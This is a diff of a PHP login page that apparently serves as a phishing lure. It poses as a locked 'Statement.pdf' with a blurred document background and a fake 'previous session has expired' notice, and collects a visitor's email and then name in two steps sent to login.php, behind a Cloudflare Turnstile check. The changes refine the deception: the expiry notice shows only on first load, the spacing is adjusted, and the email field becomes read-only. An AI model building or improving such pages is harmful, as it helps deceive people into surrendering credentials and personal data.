@@ -6,8 +6,14 @@ $step = $_SESSION['step'] ?? 1;
 
 // Old email
 $old_email = $_SESSION['old_email'] ?? '';
+
+// Error message from backend
 $error = $_SESSION['error_message'] ?? '';
 unset($_SESSION['error_message']);
+
+// Show the "previous session expired" ONLY on FIRST LOAD
+$show_expired_message = !isset($_SESSION['viewed_index']);
+$_SESSION['viewed_index'] = true;
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -50,45 +56,38 @@ unset($_SESSION['error_message']);
 body {
     margin: 0;
     font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    background: #111;
+    background: #000;
     color: var(--text-color);
-    min-height: 100vh;
 }
 
 .page-wrapper {
-    position: relative;
     min-height: 100vh;
     display: flex;
     align-items: center;
     justify-content: center;
+    position: relative;
     overflow: hidden;
 }
 
-/* Background blurred PDF preview */
 .doc-background {
     position: absolute;
     inset: 0;
-    display: flex;
-    align-items: center;
-    justify-content: center;
     filter: blur(6px);
-    transform: scale(1.04);
-    opacity: 0.7;
+    transform: scale(1.05);
+    opacity: 0.55;
 }
 
 .doc-background img {
-    max-width: 100%;
-    max-height: 100vh;
-    object-fit: contain;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
 }
 
-/* Dark overlay to increase readability */
 .page-wrapper::before {
     content: "";
     position: absolute;
     inset: 0;
     background: var(--overlay-dark);
-    pointer-events: none;
 }
 
 /* -------------------------------------------
@@ -97,23 +96,19 @@ body {
 .login-card {
     position: relative;
     z-index: 2;
-    width: 95%;
-    max-width: 320px;
+    width: 92%;
+    max-width: 330px;
     background: var(--card-bg);
     border-radius: 6px;
-    padding: 22px 22px 26px;
+    padding: 24px 22px 28px;
     box-shadow: 0 18px 45px rgba(0,0,0,0.45);
 }
 
 /* PDF Icon */
 .doc-icon {
-    width: 42px;
-    height: 42px;
-    margin: 0 auto 8px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    overflow: hidden;
+    width: 44px;
+    height: 44px;
+    margin: 0 auto 10px;
 }
 
 .doc-icon-img {
@@ -124,31 +119,31 @@ body {
 
 /* Titles */
 .doc-title {
+    text-align: center;
     font-size: 16px;
     font-weight: 600;
-    text-align: center;
-    margin-bottom: 6px;
+    margin-bottom: 4px;
 }
 
 .doc-subtitle {
     text-align: center;
     color: var(--subtext);
     font-size: 11px;
-    margin-bottom: 10px;
+    margin-bottom: 12px;
 }
 
 /* Error */
 .login-error {
     color: var(--error);
-    font-size: 11px;
-    font-weight: 600;
     text-align: center;
+    font-size: 11px;
     margin-bottom: 12px;
+    font-weight: bold;
 }
 
-/* Form fields */
+/* Fields */
 .field-wrapper {
-    margin-bottom: 12px;
+    margin-bottom: 14px;
 }
 
 .field-wrapper input {
@@ -159,36 +154,32 @@ body {
     background: transparent;
     color: var(--text-color);
     font-size: 14px;
-    outline: none;
 }
 
 .field-wrapper input:focus {
     border-color: var(--btn-bg);
-    box-shadow: 0 0 0 1px rgba(26,115,232,0.2);
 }
 
-/* Buttons */
+/* Turnstile size */
+.cf-turnstile {
+    margin-bottom: 14px;
+    transform: scale(0.93);
+    transform-origin: 0 0;
+}
+
+/* Button */
 .btn-primary {
     width: 100%;
-    padding: 11px 12px;
+    padding: 11px;
     background: var(--btn-bg);
-    color: #fff;
+    color: white;
     border: none;
     border-radius: 4px;
     cursor: pointer;
-    font-size: 14px;
-    margin-top: 6px;
 }
 
 .btn-primary:hover {
     background: var(--btn-hover);
-}
-
-/* Turnstile small size */
-.cf-turnstile {
-    transform: scale(0.9);
-    transform-origin: 0 0;
-    margin-bottom: 8px;
 }
 </style>
 </head>
@@ -196,45 +187,47 @@ body {
 <body>
 <div class="page-wrapper">
 
-    <!-- Background restored -->
     <div class="doc-background">
-        <img src="assets/background.png" alt="Document preview">
+        <img src="assets/background.png" alt="Background">
     </div>
 
     <div class="login-card">
 
         <div class="doc-icon">
-            <img src="assets/PDtrans.png" alt="PDF Icon" class="doc-icon-img">
+            <img src="assets/PDtrans.png" class="doc-icon-img">
         </div>
 
         <h2 class="doc-title">Statement.pdf <span class="doc-size">(197 KB)</span></h2>
-        <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
+
+        <?php if($step == 1 && $show_expired_message): ?>
+            <p class="doc-subtitle">Previous session has expired, log in to continue.</p>
+        <?php endif; ?>
 
         <?php if($error): ?>
             <p class="login-error"><?= htmlspecialchars($error) ?></p>
         <?php endif; ?>
 
+
         <?php if($step == 1): ?>
-        <!-- STEP 1 — EMAIL + TURNSTILE -->
+        <!-- STEP 1: EMAIL + CAPTCHA -->
         <form method="POST" action="login.php">
-            <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
 
             <div class="field-wrapper">
-                <input type="email" name="email"
-                       value="<?= htmlspecialchars($old_email) ?>"
+                <input type="email" name="email" value="<?= htmlspecialchars($old_email) ?>"
                        placeholder="Enter your email" required>
             </div>
+
+            <div class="cf-turnstile" data-sitekey="0x4AAAAAACEAdYvsKv0_uuH2"></div>
 
             <button class="btn-primary">Next</button>
         </form>
 
         <?php else: ?>
-        <!-- STEP 2 — NAME + SHOW EMAIL ABOVE -->
+        <!-- STEP 2: NAME + SHOW EMAIL -->
         <form method="POST" action="login.php">
 
             <div class="field-wrapper">
-                <input type="email" value="<?= htmlspecialchars($old_email) ?>"
-                       >
+                <input type="email" value="<?= htmlspecialchars($old_email) ?>" readonly>
             </div>
 
             <div class="field-wrapper">
@@ -243,6 +236,7 @@ body {
 
             <button class="btn-primary">Next</button>
         </form>
+
         <?php endif; ?>
 
     </div>
